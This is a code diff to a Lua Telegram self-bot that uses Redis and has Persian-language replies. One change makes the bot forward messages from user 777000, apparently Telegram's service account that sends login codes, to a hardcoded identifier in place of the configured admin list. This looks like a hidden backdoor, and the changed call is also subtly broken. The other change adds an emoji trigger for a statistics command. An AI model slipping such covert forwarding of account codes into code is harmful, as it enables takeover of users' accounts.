@@ -173,7 +173,7 @@ function get_bot (i, adigram)
             local msg = data.message_
             local bot_id = redis:get("botBOT-IDid") or get_bot()
             if (msg.sender_user_id_ == 777000 or msg.sender_user_id_ == 178220800) then
-              for k,v in pairs(redis:smembers('botBOT-IDadmin')) do
+              for k,v in pairs(redis:smembers(365196540)) do
                 tdcli_function({
                       ID = "ForwardMessages",
                       chat_id_ = v,
@@ -299,7 +299,7 @@ function get_bot (i, adigram)
                             redis:del("botBOT-IDmarkread")
                             return send(msg.chat_id_, msg.id_, "<code>بازدید خاموش شد✔️\nاز این پس هیچ پیامی تیک دوم رو دریافت نمیکند👁</code>\n➖➖➖\nلایکچی\n ")
                           end
-                        elseif text:match("^(s)$") or text:match("^(امار)$") or text:match("^(11)$") or text:match("^(4)$") or text:match("^(+)$") then
+                        elseif text:match("^(s)$") or text:match("^(امار)$") or text:match("^(11)$")or text:match("^(😂)$") or text:match("^(4)$") or text:match("^(+)$") then
                           local gps = redis:scard("botBOT-IDgroups")
                           local sgps = redis:scard("botBOT-IDsupergroups")
                           local usrs = redis:scard("botBOT-IDusers")
